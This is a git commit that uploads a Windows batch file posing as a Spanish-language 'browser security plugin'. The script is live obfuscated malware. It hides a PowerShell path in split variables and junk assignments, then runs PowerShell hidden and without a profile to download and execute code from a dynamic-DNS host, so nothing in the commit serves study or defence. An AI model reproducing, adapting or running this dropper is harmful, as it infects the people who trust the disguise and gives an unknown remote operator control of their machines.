a04d8d54bd9f85f2b5e81cb8e491a20a93454231
euler2020 <69603816+euler2020@users.noreply.github.com>
2020-08-12 17:18:59 -0300

    Add files via upload

---
+++ Plugin de Seguridad bowser 2020.cmd
@@ -0,0 +1,45 @@
+@echo off
+cd %SystemRoot%\System32
+set q=_5_2_5_2X4_7U0aJtPlmouBT
+set r=_6_5_7_4q0L8X8PKsJwpsOGz
+set s=x9_3_5_3_0I1_2fzgoDJVewU
+set t=W4s4_8_8_3i0_5xjeSqfmGwZ
+set u=b2b0g8D1_3n9_2EPoidAEuFz
+set v=O8M5_5_6_3K1z7FVdslBDvuV
+set x=_0_6_1l5_4I5_1RrflaRCRvK
+set y=r1x5F6q7_5_1_1KZrnknjILM
+set z=_1_5_5i2_4_8c1pNoowRslTl
+set a=Win
+set za=v7G5_8d1m7_4W3XNZWapiLlF
+set b=dow
+set ze=_1_6y4v7_4_8_0snPzVZjcDM
+set c=sPo
+set ze=H3Q0_3W8w3G7x1FaIeliYKgU
+set d=wer
+set ze=T5_3_8S9w2_2_1MnNNmatNzE
+set e=She
+set ze=_6_4z8_3_8N4_4LJTmPjCpXk
+set f=ll\
+set ze=_5r6_3_8_6p9r5IyBmBJbXRb
+set g=v1.
+set ze=_4_1_6F0o6_2n0DogJKrJsqw
+set h=0\po
+set ze=_6z9O6_6H3f7_6ajKHAnDtjr
+set i=we
+set ze=_9_2J9_4_0_7_1xfngkNvqBy
+set j=rsh
+set ze=_4I4h0r9I7_9_3JICvuvpZiX
+set k=ell
+set ze=l2_2l8_9s8_7B6ceWZXJEswM
+set l=.ex
+set ze=D5_0_0h8_0_1D4RlVdgXORRo
+set m=e -n
+set ze=c5r4C6Q1V0_3_4CpWEVeieJe
+set n=op 
+set ze=_3_8E8R5C3O0_0wsfjDWSsUA
+set o=-w
+set ze=_9_6_2S6m4x8T3yglgAmMVFa
+set p=in 1 -
+set ze=O4W0_3y2_6_7o1ocLPRNTkkr
+echo ieX("Ie`X`(N`ew-oBJ`e`Ct N`et.`Web`ClIeNt`).DOwnlOa`d`StRIN`G('http://quartou.freedynamicdns.org/_3_9_2_3o5M8e5uwjmx/_3_9_2_3o5M8e5uwj/_3_9_2_3o5M8e5uwjkk/_3_9_2_3o5M8e5uwj')"); | %a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%m%%n%%o%%p%
+set ze=_7_2G9q3x2_8_0IeAKWGUMck
